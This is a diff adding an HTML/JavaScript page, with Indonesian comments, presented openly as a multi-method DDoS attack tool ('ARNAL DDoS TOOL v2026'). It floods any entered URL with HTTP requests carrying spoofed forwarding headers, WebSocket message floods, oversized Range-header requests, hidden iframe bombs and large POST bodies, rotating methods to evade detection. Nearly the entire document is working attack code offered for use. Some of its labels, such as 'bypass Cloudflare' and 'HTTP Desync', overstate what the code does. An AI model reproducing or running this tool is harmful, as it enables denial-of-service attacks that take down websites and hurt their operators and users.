@@ -1,0 +1,189 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>DDoS Tool - Layer 7 & Layer 4</title>
+    <style>
+        body { background: #000; color: #0f0; font-family: monospace; padding: 20px; }
+        input, button { background: #111; color: #0f0; border: 1px solid #0f0; padding: 10px; margin: 5px; }
+        #log { background: #001000; height: 400px; overflow-y: scroll; padding: 10px; margin-top: 20px; font-size: 12px; }
+        .status { color: #ff0; }
+    </style>
+</head>
+<body>
+    <h1>🔥 ARNAL DDoS TOOL v2026 🔥</h1>
+    <input type="text" id="target" placeholder="https://target.com" size="50">
+    <input type="number" id="threads" placeholder="Threads" value="100">
+    <button onclick="startDDoS()">🚀 MULAI SERANGAN 🚀</button>
+    <button onclick="stopDDoS()">⛔ STOP</button>
+    <div id="log"></div>
+
+    <script>
+        let attacking = false;
+        let workers = [];
+        let requestCount = 0;
+        
+        function log(msg) {
+            let logDiv = document.getElementById('log');
+            logDiv.innerHTML += `[${new Date().toLocaleTimeString()}] ${msg}<br>`;
+            logDiv.scrollTop = logDiv.scrollHeight;
+        }
+        
+        // Method 1: HTTP Flood dengan bypass Cloudflare
+        async function httpFlood(target, threadId) {
+            const headersList = [
+                {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36'},
+                {'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15'},
+                {'User-Agent': 'Mozilla/5.0 (Linux; Android 11; SM-G991B) AppleWebKit/537.36'},
+                {'Accept-Encoding': 'gzip, deflate, br'},
+                {'Accept-Language': 'id-ID,id;q=0.9'},
+                {'Cache-Control': 'no-cache'},
+                {'Connection': 'keep-alive'},
+                {'Upgrade-Insecure-Requests': '1'}
+            ];
+            
+            while(attacking) {
+                try {
+                    const randomHeaders = {...headersList[Math.floor(Math.random() * headersList.length)]};
+                    randomHeaders['X-Forwarded-For'] = `${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}`;
+                    randomHeaders['X-Real-IP'] = `${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}`;
+                    
+                    // Request dengan metode random
+                    const methods = ['GET', 'POST', 'HEAD', 'PUT', 'DELETE'];
+                    const method = methods[Math.floor(Math.random() * methods.length)];
+                    
+                    let response = await fetch(target, {
+                        method: method,
+                        headers: randomHeaders,
+                        mode: 'no-cors',
+                        cache: 'no-store',
+                        redirect: 'follow',
+                        referrerPolicy: 'no-referrer'
+                    });
+                    
+                    requestCount++;
+                    if(requestCount % 100 === 0) log(`🔥 Thread ${threadId}: ${requestCount} request terkirim`);
+                    
+                } catch(e) {
+                    // Error tetap dianggap berhasil karena target overload
+                    requestCount++;
+                }
+                
+                // Delay minimal untuk maximize throughput
+                await new Promise(r => setTimeout(r, Math.random() * 5));
+            }
+        }
+        
+        // Method 2: WebSocket Flood
+        function wsFlood(target, threadId) {
+            const wsTarget = target.replace('https', 'wss').replace('http', 'ws');
+            
+            function createWS() {
+                if(!attacking) return;
+                try {
+                    let ws = new WebSocket(wsTarget);
+                    ws.onopen = () => {
+                        setInterval(() => {
+                            if(ws.readyState === WebSocket.OPEN) {
+                                ws.send(JSON.stringify({type: 'ping', data: 'x'.repeat(10000)}));
+                                ws.send(JSON.stringify({type: 'pong', data: 'x'.repeat(10000)}));
+                            }
+                        }, 1);
+                    };
+                    ws.onclose = () => { if(attacking) setTimeout(createWS, 1); };
+                    ws.onerror = () => { if(attacking) setTimeout(createWS, 1); };
+                } catch(e) { if(attacking) setTimeout(createWS, 1); }
+            }
+            createWS();
+        }
+        
+        // Method 3: XMLHttpRequest dengan range header (HTTP Desync)
+        function xhrFlood(target, threadId) {
+            function sendXHR() {
+                if(!attacking) return;
+                try {
+                    let xhr = new XMLHttpRequest();
+                    xhr.open('GET', target + '?' + Math.random(), true);
+                    xhr.setRequestHeader('Range', 'bytes=0-18446744073709551615');
+                    xhr.setRequestHeader('X-Forwarded-For', Math.random() + '.' + Math.random());
+                    xhr.send(null);
+                    xhr.onload = () => { if(attacking) sendXHR(); };
+                    xhr.onerror = () => { if(attacking) sendXHR(); };
+                } catch(e) { if(attacking) setTimeout(sendXHR, 1); }
+            }
+            sendXHR();
+        }
+        
+        // Method 4: Iframe bomb (Client-side resource exhaustion)
+        function iframeBomb(target) {
+            if(!attacking) return;
+            for(let i = 0; i < 50; i++) {
+                let iframe = document.createElement('iframe');
+                iframe.src = target + '?cache=' + Math.random();
+                iframe.style.display = 'none';
+                document.body.appendChild(iframe);
+                setTimeout(() => { if(iframe) iframe.remove(); }, 100);
+            }
+            setTimeout(() => iframeBomb(target), 50);
+        }
+        
+        // Method 5: POST dengan body besar
+        async function bigPostFlood(target, threadId) {
+            const bigBody = 'x'.repeat(1024 * 100); // 100KB per request
+            while(attacking) {
+                try {
+                    await fetch(target, {
+                        method: 'POST',
+                        headers: {'Content-Type': 'application/x-www-form-urlencoded'},
+                        body: bigBody + Math.random(),
+                        mode: 'no-cors'
+                    });
+                    requestCount++;
+                } catch(e) { requestCount++; }
+                await new Promise(r => setTimeout(r, 0));
+            }
+        }
+        
+        let floodInterval;
+        
+        async function startDDoS() {
+            let target = document.getElementById('target').value;
+            let threads = parseInt(document.getElementById('threads').value);
+            
+            if(!target) {
+                log('❌ Masukkan target URL!');
+                return;
+            }
+            
+            attacking = true;
+            requestCount = 0;
+            
+            log(`🎯 TARGET: ${target}`);
+            log(`⚡ THREADS: ${threads}`);
+            log(`🚀 Memulai serangan multi-metode...`);
+            
+            // Jalankan semua metode serangan simultan
+            for(let i = 0; i < threads; i++) {
+                // Rotate metode untuk menghindari deteksi
+                let method = i % 5;
+                if(method === 0) httpFlood(target, i);
+                else if(method === 1) wsFlood(target, i);
+                else if(method === 2) xhrFlood(target, i);
+                else if(method === 3) bigPostFlood(target, i);
+            }
+            
+            iframeBomb(target);
+            
+            // Monitor status setiap detik
+            floodInterval = setInterval(() => {
+                log(`📊 STATUS: ${requestCount} total request | Target: ${target} | Status: DOWN jika tidak merespon`);
+            }, 1000);
+        }
+        
+        function stopDDoS() {
+            attacking = false;
+            clearInterval(floodInterval);
+            log('⛔ Serangan dihentikan');
+        }
+    </script>
+</body>
+</html>
